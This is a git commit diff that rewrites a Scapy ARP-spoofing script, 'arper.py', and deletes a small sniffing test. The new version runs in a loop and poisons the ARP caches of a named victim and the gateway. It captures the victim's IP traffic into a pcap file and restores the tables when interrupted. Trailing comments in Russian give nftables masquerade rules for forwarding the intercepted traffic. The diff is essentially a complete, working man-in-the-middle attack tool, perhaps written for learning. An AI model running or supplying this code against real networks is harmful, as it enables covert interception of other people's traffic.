67d41b8f4498282f65c7974794a2d7067e7a471b
dmtr35 <nuke-id@yandex.ru>
2025-11-29 18:42:51 +0200

    Auto-commit: 29-11-2025 18:42:51 Modified: scapy/arper.pcap, scapy/arper.py Deleted:  scapy/arptesting.py, scapy/poisoner.py, scapy/sniff_test.py, scapy/test.py

--- scapy/arper.py
+++ scapy/arper.py
@@ -1,19 +1,19 @@
-from multiprocessing import Process
-from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
-                       send, sniff, sndrcv, srp, wrpcap)
-import os
+from multiprocessing import Process, Event
+from scapy.all import (ARP, Ether, wrpcap, conf, sendp, sniff, srp)
 import sys
 import time
 
+
 def get_mac(targetip):
-    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
-    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
+    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=targetip)
+    resp, _ = srp(packet, timeout=2, retry=5, verbose=False)
     for _, r in resp:
         return r[Ether].src
     return None
 
+
 class Arper:
-    def __init__(self, victim, gateway, interface='br0'):
+    def __init__(self, victim, gateway, interface):
         self.victim = victim
         self.victimmac = get_mac(victim)
 
@@ -27,89 +27,106 @@ class Arper:
         print(f'Initialized {interface}:')
         print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
         print(f'Victim ({victim}) is at {self.victimmac}.')
-        print('-'*30)
+        print('-' * 30)
+
+        self.stop_flag = Event()
 
     def run(self):
-        self.poison_thread = Process(target=self.poison)
-        self.poison_thread.start()
+        self.poison_proc = Process(target=self.poison)
+        self.sniff_proc  = Process(target=self.sniff)
 
-        self.sniff_thread = Process(target=self.sniff)
-        self.sniff_thread.start()
+        self.poison_proc.start()
+        self.sniff_proc.start()
+
+        try:
+            # main thread waits until sniff_proc finishes
+            self.sniff_proc.join()
+        except KeyboardInterrupt:
+            print("Ctrl+C received, stopping...")
+
+            # tell poison thread to exit
+            self.stop_flag.set()
+
+            # give some time
+            time.sleep(1)
+
+            # kill sniff forcibly (it blocks libpcap)
+            self.sniff_proc.terminate()
+            self.poison_proc.terminate()
+
+            self.restore()
+            print("ARP tables restored. Exiting.")
+            sys.exit()
 
     def poison(self):
-        poison_victim = ARP()
-        poison_victim.op = 2
-        poison_victim.psrc = self.gateway
-        poison_victim.pdst = self.victim
-        poison_victim.hwdst = self.victimmac
+        poison_victim = ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victimmac)
+        poison_gateway = ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gatewaymac)
 
-        print(f'ip src: {poison_victim.psrc}')
-        print(f'ip dst: {poison_victim.pdst}')
-        print(f'mac dst: {poison_victim.hwdst}')
-        print(f'mac src: {poison_victim.hwsrc}')
-        print(poison_victim.summary())
-        print('-'*30)
+        print("Starting ARP poison...")
 
-        poison_gateway = ARP()
-        poison_gateway.op = 2
-        poison_gateway.psrc = self.victim
-        poison_gateway.pdst = self.gateway
-        poison_gateway.hwdst = self.gatewaymac
+        while not self.stop_flag.is_set():
+            sendp(Ether(dst=self.victimmac) / poison_victim, verbose=False)
+            sendp(Ether(dst=self.gatewaymac) / poison_gateway, verbose=False)
+            time.sleep(2)
 
-        print(f'ip src: {poison_gateway.psrc}')
-        print(f'ip dst: {poison_gateway.pdst}')
-        print(f'mac dst: {poison_gateway.hwdst}')
-        print(f'mac src: {poison_gateway.hwsrc}')
-        print(poison_gateway.summary())
-        print('-'*30)
-        print(f'Beginning the ARP poison. [CTRL-C to stop]')
 
-        while True:
-            sys.stdout.write('.')
-            sys.stdout.flush()
-            try:
-                # send(Ether(dst=self.victimmac)/poison_victim)
-                # send(Ether(dst=self.gatewaymac)/poison_gateway)
-                send(poison_victim)
-                send(poison_gateway)
-            except KeyboardInterrupt:
-                self.restore()
-                sys.exit()
-            else:
-                time.sleep(2)
-    
-    def sniff(self, count=10000):
-        time.sleep(5)
-        print(f'Sniffing {count} packets')
-        # bpf_filter = "ip host %s" % victim
+    def sniff(self):
         bpf_filter = f"ip host {self.victim}"
-        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
-        wrpcap('arper.pcap', packets)
-        print('Got the packets')
-        self.restore()
-        self.poison_thread.terminate()
-        print('Finished.')
+
+        print("Sniffing started...")
+
+        while not self.stop_flag.is_set():
+            packet = sniff(count=1, filter=bpf_filter, iface=self.interface)
+            wrpcap('arper.pcap', packet, append=True)
+
+
 
     def restore(self):
-        print('Restoring ARP tables...')
-        send(ARP(
-        # send(Ether(dst=self.victimmac)/ARP(
+        print("Restoring ARP tables...")
+
+        sendp(Ether(dst=self.victimmac) / ARP(
             op=2,
             psrc=self.gateway,
             hwsrc=self.gatewaymac,
             pdst=self.victim,
-            hwdst='ff:ff:ff:ff:ff:ff'),
-            count=5)
-        send(ARP(
-        # send(Ether(dst=self.gatewaymac)/ARP(
+            hwdst="ff:ff:ff:ff:ff:ff"
+        ), count=5, verbose=False)
+
+        sendp(Ether(dst=self.gatewaymac) / ARP(
             op=2,
             psrc=self.victim,
             hwsrc=self.victimmac,
             pdst=self.gateway,
-            hwdst='ff:ff:ff:ff:ff:ff'),
-            count=5)
+            hwdst="ff:ff:ff:ff:ff:ff"
+        ), count=5, verbose=False)
+
 
 if __name__ == '__main__':
-    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
-    myarp = Arper(victim, gateway, interface)
-    myarp.run()
+    victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
+    arper = Arper(victim, gateway, interface)
+    arper.run()
+
+
+
+
+# ---------------------------------------------------------------------------
+# instructions
+# добавить таблицу в /etc/nftables.conf
+
+# table ip masq {
+#     chain postrouting {
+#         type nat hook postrouting priority srcnat; policy accept;
+
+#         # Маскарадинг для внешнего интерфейса br0
+#         oifname "br0" masquerade
+
+#     }
+# }
+
+# применить измениния 
+# nft -f /etc/nftables.conf
+# ---------------------------------------------------------------------------
+
+
+
+
--- scapy/test.py
+++
@@ -1,6 +0,0 @@
-from scapy.all import sniff
-
-print("Sniff ARP...")
-# pkts = sniff(count=3, filter="ip host 192.168.2.21", iface="enp7s0")
-pkts = sniff(count=3, filter="ip host 192.168.2.21", iface="br0")
-print("Done:", pkts)
